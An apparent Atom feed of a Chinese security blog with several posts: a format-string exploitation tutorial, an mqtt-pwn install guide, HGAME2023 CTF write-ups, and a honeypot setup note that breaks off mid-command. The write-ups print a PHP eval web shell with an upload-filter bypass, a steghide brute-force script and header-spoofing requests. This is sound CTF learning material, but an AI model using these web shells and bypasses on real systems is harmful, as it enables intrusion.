<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>π1L4r</title>
  
  <subtitle>Stay sharp, stay cool</subtitle>
  <link href="https://blog.pillar.fun/atom.xml" rel="self"/>
  
  <link href="https://blog.pillar.fun/"/>
  <updated>2023-02-24T07:58:25.431Z</updated>
  <id>https://blog.pillar.fun/</id>
  
  <author>
    <name>π1L4r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="https://blog.pillar.fun/2023/02/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://blog.pillar.fun/2023/02/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-02-23T09:46:47.000Z</published>
    <updated>2023-02-24T07:58:25.431Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的pwn知识点总结</p><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><h3 id="printf特性"><a href="#printf特性" class="headerlink" title="printf特性"></a>printf特性</h3><p>首先我们要理解一下printf的一些特性。</p><p>printf第一个参数是fmt，即格式化字符串，格式化字符串中可以包含格式化占位符，其语法是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%[ parameter ][ flags ][ field width ][. precision ][ length ]type</span><br></pre></td></tr></table></figure><p><img src="/2023/02/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1677145835400.png" alt="1677145835400"></p><p><img src="/2023/02/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1677209898069.png" alt="1677209898069"></p><p><img src="/2023/02/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1677209916094.png" alt="1677209916094"></p><p><img src="/2023/02/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1677209931303.png" alt="1677209931303"></p><p>会出现格式化字符串漏斗的原因在于，printf不对格式化占位符和之后的参数数量做校验，在fmt里遇到格式化占位符，就直接在栈里通过偏移进行间接寻址，所以就能导致直接任意读取栈内数据</p><p>下面是printf的函数栈结构</p><p><img src="/2023/02/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1677148427755.png" alt="1677148427755"></p><h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>如果我们可以让 <code>printf</code>从格式化字符串获取地址（也位于栈上），我们就可以控制该地址。</p><p>例如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf (&quot;\x10\x01\x48\x08 %x %x %x %x %s&quot;);</span><br></pre></td></tr></table></figure><p><code>\x10\x01\x48\x08</code>是目标地址的四个字节。在 C 语言中，<code>\x10</code>让编译器将十六进制值 0x10 放入当前位置。这个值只占一个字节。如果我们不使用 <code>\x</code>，直接将 10 放入字符串，就会储存 ASCII 值 1 和 0。它们的 ASCII 值是 49 和 48。</p><p><img src="/2023/02/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1677148809771.png" alt="1677148809771"></p><p>调用函数从右往左入栈，上图里，右边为低地址，为栈顶，在本例子call printf的时候，只有一个参数，也就是 <code>&quot;\x10\x01\x48\x08 %x %x %x %x %s&quot;</code>，作为一个字符串，他的首地址被压入栈中，在printf函数栈栈顶</p><p>左边彩色的部分是格式化字符串在printf的caller函数栈空间的实参，实际上可能好几个%x会挤在一个内存单元里，这里只是方便理解</p><p>右边白色的部分是printf的函数栈。address of user_input指针（fmt指针）和user_input数组（fmt本身）之间间隔了一些call过程中压入栈的内容，包括caller函数esp，返回地址等等。</p><p>通过printf函数的特点，第一个%x会与其函数栈中指针下面的那个内存单元想匹配，就是图中的1st%x所指的内存单元，而不会去检测printf是否真的输入了这么多的参数。因此，利用无脑%x读取栈内存，可以得到fmt本身的位置与栈顶指向fmt的指针的地址之间间隔的内存单元数，再通过填充相应数量的%x即可将%s与0x10014808匹配，进而输出0x10014808地址的内容</p><p>当然我们也可以通过X$的方式（X为数），来避免这么多的%x</p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>接下来介绍一下任意位置写，也就是%n，和任意地址读非常相似</p><p>%n的作用是将已打印的字符个数输入到和%n所对应的参数所指向地址，遵循printf格式化占位符的寻址方式。</p><p>格式就是%ax%b$n，指的是向格式化字符串指针所在内存偏移b的内存里的内容的地址写a</p><p>也可以直接利用 pwntools 的 fmtstr_payload 函数即可生成相应的 payload</p><p>格式为fmtstr_payload(offset,{addr:value})，其中offset为我们之前确定的格式化字符串参数的偏移量，addr为我们想要修改的地址，value为我们想要将覆盖至地址上的值。</p><p>参考</p><p><a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2#:~:text=%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88%E8%8B%B1%E8%AA%9E,%E4%B8%80%E7%A8%AE%E5%BD%A2%E5%BC%8F%E8%BC%B8%E5%87%BA%E7%9A%84%E5%87%BD%E6%95%B0%E3%80%82">https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2#:~:text=%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88%E8%8B%B1%E8%AA%9E,%E4%B8%80%E7%A8%AE%E5%BD%A2%E5%BC%8F%E8%BC%B8%E5%87%BA%E7%9A%84%E5%87%BD%E6%95%B0%E3%80%82</a></p><p><a href="https://www.anquanke.com/post/id/180009">https://www.anquanke.com/post/id/180009</a></p><p><a href="https://wizardforcel.gitbooks.io/syracuse-sec-lecture-notes/content/7.html">https://wizardforcel.gitbooks.io/syracuse-sec-lecture-notes/content/7.html</a></p><p><a href="https://www.cnblogs.com/0xJDchen/p/5904816.html">https://www.cnblogs.com/0xJDchen/p/5904816.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://blog.pillar.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>mqtt-pwn安装</title>
    <link href="https://blog.pillar.fun/2023/01/19/mqtt-pwn%E5%AE%89%E8%A3%85/"/>
    <id>https://blog.pillar.fun/2023/01/19/mqtt-pwn%E5%AE%89%E8%A3%85/</id>
    <published>2023-01-19T03:55:43.000Z</published>
    <updated>2023-01-19T04:16:23.048Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>最近有点想入坑iot安全，必先利其器，所以简单讲一下mqtt-pwn的安装</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>在kali上安装docker，然后去</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akamai-threat-research/mqtt-pwn.git</span><br><span class="line"><span class="built_in">cd</span> mqtt-pwn</span><br><span class="line"></span><br><span class="line">sudo service docker start</span><br><span class="line">systemctl <span class="built_in">enable</span> docker.servive</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker.service</span><br><span class="line">sudo systemctl status docker.service</span><br><span class="line">sudo docker-compose up --build --detach</span><br><span class="line">sudo docker-compose ps</span><br><span class="line">sudo docker-compose run cli</span><br></pre></td></tr></table></figure><p>这里简单说一下我遇到的问题</p><p>首先是在build的时候，提示我安装东西返回值100</p><p><img src="/2023/01/19/mqtt-pwn%E5%AE%89%E8%A3%85/1674101001898.png" alt="1674101001898"></p><p>好像是因为dockerfile里没加sudo，但是感觉我们本身就是sudo docker-compose，所以我也没搞懂，但是我发现这几个软件其实都装了，然后我就把dockerfile里那一行直接删了</p><p>其二是</p><p>在装python的一些依赖的时候很慢，国情所至，也不好说什么，但是可以在dockerfile里面修改一下，改用镜像来安装，或者之前一劳永逸的改了pip源也行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip config set global.index-url https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br></pre></td></tr></table></figure><p><img src="/2023/01/19/mqtt-pwn%E5%AE%89%E8%A3%85/1674101746257.png" alt="1674101746257"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HGAME2023</title>
    <link href="https://blog.pillar.fun/2023/01/06/HGAME2023/"/>
    <id>https://blog.pillar.fun/2023/01/06/HGAME2023/</id>
    <published>2023-01-06T05:06:43.000Z</published>
    <updated>2023-01-18T04:04:20.959Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>base64</p><p>hgame{Welcome_To_HGAME2023!}</p><h3 id="e99p1ant-want-girlfriend"><a href="#e99p1ant-want-girlfriend" class="headerlink" title="e99p1ant_want_girlfriend"></a>e99p1ant_want_girlfriend</h3><p>改图片size</p><p><img src="/2023/01/06/HGAME2023/1.png" alt="img"></p><h3 id="神秘的海报"><a href="#神秘的海报" class="headerlink" title="神秘的海报"></a>神秘的海报</h3><p>LSB RGB0得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sure eno ugh, you still r emember what we  talked about at  that time! This  is part of the s ecret: &#96;hgame&#123;U_ Kn0w_LSB&amp;W&#96;.I pu t the rest of th e content here,  https:&#x2F;&#x2F;drive.go ogle.com&#x2F;file&#x2F;d&#x2F; 13kBos3Ixlfwkf3e 0z0kJTEqBxm7RUk- G&#x2F;view?usp&#x3D;shari ng, if you direc tly access the g oogle drive clou d disk download  in China, it wil l be very slow,  you can try to u se Scientific In ternet access so lves the problem  of slow or inac cessible access  to external netw ork resources. T his is my favori te music, there  is another part  of the secret in  the music, I us e Steghide to en crypt, the passw ord is also the  6-digit password  we agreed at th e time, even if  someone else fin ds out here, it  should not be so  easy to crack ( ( hope so</span><br></pre></td></tr></table></figure><p>得到前半截flag是</p><p>hgame{U_ Kn0w_LSB&amp;W，后半截去谷歌云盘下</p><p>提示是steghide加密，密码6位，于是生成字典</p><p><code>crunch 6 6 0123456789 -o 6dig.txt</code></p><p>然后跑之前抄来的steghide暴破脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /bin/python3</span></span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    stegoFile=<span class="string">&#x27;Bossnova.wav&#x27;</span></span><br><span class="line">    extractFile=<span class="string">&#x27;passwd.txt&#x27;</span><span class="comment">#爆破的密码</span></span><br><span class="line">    passFile=<span class="string">&#x27;6dig.txt&#x27;</span><span class="comment">#字典</span></span><br><span class="line"></span><br><span class="line">    errors=[<span class="string">&#x27;could not extract&#x27;</span>,<span class="string">&#x27;steghide --help&#x27;</span>,<span class="string">&#x27;Syntax error&#x27;</span>]</span><br><span class="line">    cmdFormat=<span class="string">&#x27;steghide extract -sf &quot;%s&quot; -xf &quot;%s&quot; -p &quot;%s&quot;&#x27;</span></span><br><span class="line">    f=<span class="built_in">open</span>(passFile,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        cmd=cmdFormat %(stegoFile,extractFile,line.strip())</span><br><span class="line">        p=Popen(cmd,shell=<span class="literal">True</span>,stdout=PIPE,stderr=STDOUT)</span><br><span class="line">        content=<span class="built_in">str</span>(p.stdout.read(),<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> err <span class="keyword">in</span> errors:</span><br><span class="line">            <span class="keyword">if</span> err <span class="keyword">in</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (content),</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;the passphrase is %s&#x27;</span> %(line.strip()))</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>跑一会儿得到密码123456</p><p>后来看官方wp出题人居然说6位先试123456，啊这……</p><p><img src="/2023/01/06/HGAME2023/4.png" alt="img"></p><p>hgame{U_Kn0w_LSB&amp;Wav^Mp3_Stego}</p><h3 id="where-i-am"><a href="#where-i-am" class="headerlink" title="where i am"></a>where i am</h3><p>导出http对象，得到一个压缩包，winrar打开，有密码，且提示文件头受损</p><p><img src="/2023/01/06/HGAME2023/3.png" alt="img"></p><p><img src="/2023/01/06/HGAME2023/2.png" alt="img"></p><p>现在是想修复了rar然后再暴破，但是我好困，等会睡醒了再找找怎么修复rar吧。</p><p>原来是我的010editor的模板版本太老了，没解析出来，现在我们可以解析出来，然后发现header的crc不对</p><p><img src="/2023/01/06/HGAME2023/5.png" alt="img"></p><p>把crc改回去就不报错了，然后猜测是rar伪加密，把Exchangeable的那啥改了</p><p><img src="/2023/01/06/HGAME2023/6.png" alt="img"></p><p>解压出来了jpg，用exiftools查看exif信息</p><p><img src="/2023/01/06/HGAME2023/8.png" alt="img"></p><p>根据题目，flag是hgame{116_24_1488_E_39_54_5418_N}</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>factordb分解大数得到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p =  <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">q =  <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br></pre></td></tr></table></figure><p>知道p、q、e，解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p =  <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">q =  <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi) <span class="comment"># 通过e和phi求d</span></span><br><span class="line">m = gmpy2.powmod(c,d,n) <span class="comment"># 通过d和n解密</span></span><br><span class="line">print(m)</span><br><span class="line">print(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])                      <span class="comment">#16进制明文</span></span><br><span class="line">print(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))       <span class="comment">#16进制转文本</span></span><br></pre></td></tr></table></figure><h3 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h3><p>吧morse拖到au里，然后手打杠丶</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">----- ..--- ..--- ...-- . ..--.- .--. .-. .. .. -... .-.. -.-- ..--.- ..--.- .... --- -. .-- .- ..--.- .--- -- --. .... ..--.- ..-. --. -.- -.-. --.- .- --- --.- - -- ..-. .-.</span><br></pre></td></tr></table></figure><p>得到</p><p>0223E_PRIIBLY__HONWA_JMGH_FGKCQAOQTMFR</p><p>然后另一个txt里面base64解码，得到</p><p><code>几个星期前，我们收到一个神秘的消息。但是这个消息被重重加密，我们不知道它的真正含义是什么。唯一知道的信息是关于密钥的：“只有倒着翻过十八层的篱笆才能抵达北欧神话的终点”。</code></p><p>倒着（reverse）：rfmtqoaqckgfhgmjawnohylbiirpe3220</p><p>十八层（ROT18）：eszgdbndpxtsutzwnjabulyovvecr8775</p><p>篱笆（Fence）：</p><p>tmd，什么玩意儿啊</p><p>看了wp，18层是维吉尼亚18，您？</p><p><img src="/2023/01/06/HGAME2023/1674014601752.png" alt="1674014601752"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h3><p>请求头的问题，用bp抓包</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:31614</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Cute-Bunny</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, Vidar</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>code=Vidar</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>bunnybunnybunny.com</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;: &quot;luckytoday&quot;, &quot;password&quot;: &quot;happy123&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还以为是自定义了code字段要让他为Vidar</p><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><p>不会有人打不通魔塔8层吧</p><p><img src="/2023/01/06/HGAME2023/9.png" alt="img"></p><p>没错，我不会，单机开挂谁喷我谁司马好吗？</p><p>source里找到core.js，但我ctrl+F没找到获胜的逻辑，开始暴躁审计，看到一半直接改</p><p><img src="/2023/01/06/HGAME2023/10.png" alt="img"></p><p><img src="/2023/01/06/HGAME2023/11.png" alt="img"></p><p>去超市买防御和攻击或者吃宝石，不论是啥都加1k，钱越花越多，钥匙越开越多，一路平推，得到flag</p><p>后来看wp，发现结束的逻辑在res/event.js</p><p><img src="/2023/01/06/HGAME2023/1674011391526.png" alt="1674011391526"></p><p>直接在控制台里打mota()就得了</p><p>注意看，这个mota()函数经过了乱七八糟的混淆</p><p><img src="/2023/01/06/HGAME2023/1674011670096.png" alt="1674011670096"></p><p>解混淆的事儿，下次再说儿</p><h3 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h3><p>一个上传头像，并且告诉你头像上传到了./img/*的位置</p><p>所以写一个一句话<code>&lt;?php @eval($_POST[&#39;pillar&#39;]); ?&gt;</code></p><p>然后上传，发现前端过滤了文件后缀名，于是改后缀名为jpg，抓包再改为php，然后发现后端也有过滤，尝试一些其他的后缀名，包括php5、php4、phtml，发现都不太行</p><p><img src="/2023/01/06/HGAME2023/1674014097002.png" alt="1674014097002"></p><p>尝试大小写绕过，发现可以</p><p><img src="/2023/01/06/HGAME2023/1674014135823.png" alt="1674014135823"></p><p>然后访问一下，发现也可以访问到</p><p><img src="/2023/01/06/HGAME2023/1674014205289.png" alt="1674014205289"></p><p>然后蚁剑连接，在根目录下获得flag</p><p><img src="/2023/01/06/HGAME2023/1674014233428.png" alt="1674014233428"></p><h3 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h3><p>根据hint，到<a href="https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js">https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js</a>获取成员名单</p><p>本来看这js直接export default了，寻思学习学习，拿js写个脚本试试，但是感觉nodejs环境属实有点8行，一会儿commonjs一会儿es6的搞得我有丶晕，回归舒适区吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;./member.js&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">id_tmp=<span class="string">&quot;&quot;</span></span><br><span class="line">intro_tmp=<span class="string">&quot;&quot;</span></span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fp.readlines():</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;&quot;id&quot;&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">id_tmp = line.decode().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)[<span class="number">6</span>:-<span class="number">4</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;&quot;intro&quot;&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">intro_tmp = line.decode().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)[<span class="number">9</span>:-<span class="number">4</span>]</span><br><span class="line">dic[intro_tmp] = id_tmp</span><br><span class="line">id_tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">intro_tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://week-1.hgame.lwsec.cn:30128/api/getQuestion&#x27;</span></span><br><span class="line">resp = session.get(url)</span><br><span class="line">cookies = resp.cookies.get_dict()</span><br><span class="line">res=dic[resp.content.decode()[<span class="number">12</span>:-<span class="number">2</span>].replace(<span class="string">&quot;\\u0026&quot;</span>,<span class="string">&quot;&amp;&quot;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">url1=<span class="string">&quot;http://week-1.hgame.lwsec.cn:30128/api/verifyAnswer&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;id&quot;</span>: res&#125;</span><br><span class="line">resp1 = session.post(url1, cookies = cookies, data = data)</span><br><span class="line">print(resp1.text)</span><br><span class="line">cookies = resp1.cookies.get_dict()</span><br><span class="line">url2=<span class="string">&quot;http://week-1.hgame.lwsec.cn:30128/api/getScore&quot;</span></span><br><span class="line">resp2 = session.get(url2, cookies = cookies)</span><br><span class="line">print(resp2.text)</span><br><span class="line">cookies = resp2.cookies.get_dict()</span><br><span class="line">url=<span class="string">&#x27;http://week-1.hgame.lwsec.cn:30128/api/getQuestion&#x27;</span></span><br><span class="line">resp = session.get(url,cookies = cookies)</span><br><span class="line">cookies = resp.cookies.get_dict()</span><br><span class="line">res=dic[resp.content.decode()[<span class="number">12</span>:-<span class="number">2</span>].replace(<span class="string">&quot;\\u0026&quot;</span>,<span class="string">&quot;&amp;&quot;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/01/06/HGAME2023/12.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>部署Hfish蜜罐</title>
    <link href="https://blog.pillar.fun/2023/01/04/%E9%83%A8%E7%BD%B2Hfish%E8%9C%9C%E7%BD%90/"/>
    <id>https://blog.pillar.fun/2023/01/04/%E9%83%A8%E7%BD%B2Hfish%E8%9C%9C%E7%BD%90/</id>
    <published>2023-01-04T03:07:42.000Z</published>
    <updated>2023-01-04T04:40:28.854Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>摸鱼被领导发现，要求我提供价值，看了看公司各种各样的waf、ips、防火墙，一时不知道该做些什么，还好还有蜜罐能让我部署着玩，下面是部署过程中遇到的小问题。</p><h1 id="部署流程"><a href="#部署流程" class="headerlink" title="部署流程"></a>部署流程</h1><h2 id="部署管理节点"><a href="#部署管理节点" class="headerlink" title="部署管理节点"></a>部署管理节点</h2><p><a href="https://hfish.net/#/">https://hfish.net/#/</a></p><p>Hfish的官方部署文档已经是相当详细了，由于提示了</p><p><img src="/2023/01/04/%E9%83%A8%E7%BD%B2Hfish%E8%9C%9C%E7%BD%90/1.png" alt="img"></p><p>所以选择用Centos来部署，公司有一套vmware的vsphare虚拟化，直接部一个Centos7的模板。</p><p>为了能使用<a href="https://hfish.net/#/2-2-linux">官方部署文档一键安装</a>，首先要让我们的虚拟机能联网，到防火墙上放下策略，如果宁公司策略不是很严谨，可以忽略。</p><p>然后就一键安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --add-port=4433/tcp --permanent   <span class="comment">#（用于web界面启动）</span></span><br><span class="line">firewall-cmd --add-port=4434/tcp --permanent   <span class="comment">#（用于节点与管理端通信）</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line">bash &lt;(curl -sS -L https://hfish.net/webinstall.sh)</span><br></pre></td></tr></table></figure><p>此时此刻，你就可以在<a href="https://CentOS的ip:4433/web/打开管理节点了。">https://CentOS的ip:4433/web/打开管理节点了。</a></p><h2 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h2><p>一键部署自带了postgresql，和一堆蜜罐，但是文档告诉我们需要用mysql来实现稳定运行，因此我们需要装个mysql或Mariadb</p><p>centos7自带MariaDB，但是没有客户端，我的选择是删了mariadb然后装mysql的社区版</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -qa|grep mariadb <span class="comment"># 查看是否装了mariadb</span></span><br><span class="line">rpm -e --nodeps mariadb-libs-5.5.44-2.el7.centos.x86_64 <span class="comment"># 强删mariadb</span></span><br><span class="line">wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm <span class="comment"># 获取mysql的yum源</span></span><br><span class="line">yum -y install mysql57-community-release-el7-10.noarch.rpm <span class="comment"># 安装mysql的yum源</span></span><br><span class="line">yum -y install mysql-community-server <span class="comment"># 安装mysql</span></span><br></pre></td></tr></table></figure><p>到了安装mysql的一步发生了报错，提示</p><p><code>The GPG keys listed for the “MySQL 5.7 Community Server” repository are already installed but they are not correct for this package.</code></p><p>这是因为mysql的GPGkey变了，用下面的命令</p><p><code>rpm --import 